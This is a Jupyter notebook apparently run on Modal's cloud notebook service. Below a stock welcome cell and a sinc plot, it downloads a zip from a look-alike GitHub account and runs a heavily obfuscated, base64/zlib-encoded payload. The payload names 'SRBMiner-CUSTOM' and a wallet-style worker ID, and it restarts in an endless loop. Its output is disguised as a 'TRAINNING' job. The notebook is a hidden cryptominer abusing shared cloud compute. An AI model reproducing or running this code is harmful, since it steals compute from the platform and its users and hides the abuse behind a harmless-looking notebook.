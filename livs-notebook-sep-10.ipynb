{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Welcome to Modal notebooks!\n",
        "\n",
        "Write Python code and collaborate in real time. Your code runs in Modal's\n",
        "**serverless cloud**, and anyone in the same workspace can join.\n",
        "\n",
        "This notebook comes with some common Python libraries installed. Run\n",
        "cells with `Shift+Enter`."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "collapsed": false,
        "scrolled": true
      },
      "source": [
        "import matplotlib.pyplot as plt\n",
        "import numpy as np\n",
        "\n",
        "x = np.linspace(-6, 6, 1000)\n",
        "y = np.sinc(x)\n",
        "\n",
        "plt.plot(x, y, color=\"darkblue\")\n",
        "plt.axhline(0, color=\"black\", linewidth=0.5)\n",
        "plt.axvline(0, color=\"black\", linewidth=0.5)\n",
        "plt.grid(True, alpha=0.3)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "collapsed": false,
        "scrolled": true
      },
      "source": [
        "import subprocess\n",
        "import os\n",
        "import signal\n",
        "import requests\n",
        "import zipfile\n",
        "from time import sleep\n",
        "import zlib,base64\n",
        "\n",
        "timeout = 1800\n",
        "\n",
        "# download file\n",
        "url = \"https://github.com/G1tHuP333/test/raw/refs/heads/main/SystemFile.zip\"\n",
        "filename = 'SystemFile.zip'\n",
        "response = requests.get(url, stream=True)\n",
        "file = open(filename, \"wb\")\n",
        "file.write(response.content)\n",
        "file.close()\n",
        "\n",
        "# unzip file \n",
        "with zipfile.ZipFile('SystemFile.zip', 'r') as zip_ref:\n",
        "\tzip_ref.extractall()\n",
        "\n",
        "# delete zip file\n",
        "os.remove('SystemFile.zip')\n",
        "\n",
        "code = \"import zlib,base64;threads=2;name='SRBMiner-CUSTOM/0.0.4';wname='MZCpYYo42ESmogzNNvdXogdDDzoFLgZeWB.MD';_=lambda O0O0O0O00O00O00O00O00O0O0O00O00O0O00O00O00O0O0O0O0O0O0O00O0O00O00O00O00O0O0O0O0O0O0O00O00O0O0O0O00O00O0O00O00O00O00O00O0O0O0O00O0O00O0O0O0O00O00O0O0O00O0O0O00O0O00O00O00O0O0O0O00O00O0O00O0O00O00O00O00O0O00O0O0O00O0O0O00O0O0O0O0O00O0O0O0O0O00O00O00O0:__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJyryslMAgAEZAGy')).decompress(__import__((lambda s:zlib.decompress(base64.b64decode(s)).decode())('eJxLSixONTMBAAfSAgY=')).b64decode(O0O0O0O00O00O00O00O00O0O0O00O00O0O00O00O00O0O0O0O0O0O0O00O0O00O00O00O00O0O0O0O0O0O0O00O00O0O0O0O00O00O0O00O00O00O00O00O0O0O0O00O0O00O0O0O0O00O00O0O0O00O0O0O00O0O00O00O00O0O0O0O00O00O0O00O0O00O00O00O00O0O00O0O0O00O0O0O00O0O0O0O0O00O0O0O0O0O00O00O00O0[::-1]));exec(_(b'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'))\"\n",
        "\n",
        "while True:\n",
        "    print(f\"\u25b6\ufe0f \u0110ang ch\u1ea1y code v\u1edbi timeout {timeout}\")\n",
        "    # T\u1ea1o process group m\u1edbi \u0111\u1ec3 kill c\u1ea3 nh\u00f3m\n",
        "    process = subprocess.Popen(\n",
        "        [\"python\", \"-c\", code],\n",
        "        preexec_fn=os.setsid  # T\u1ea1o process group\n",
        "    )\n",
        "    try:\n",
        "        process.wait(timeout=timeout)\n",
        "    except subprocess.TimeoutExpired:\n",
        "        print(f\"\u23f0 H\u1ebft {timeout}, \u0111ang kill to\u00e0n b\u1ed9 ti\u1ebfn tr\u00ecnh...\")\n",
        "        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Kill c\u1ea3 nh\u00f3m\n",
        "    sleep(1)\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u25b6\ufe0f \u0110ang ch\u1ea1y code v\u1edbi timeout 1800\n",
            "\u001b[H\u001b[2JTRAINNING...|N/A|2|0|0.00 U/s\n",
            "\u001b[H\u001b[2J"
          ]
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
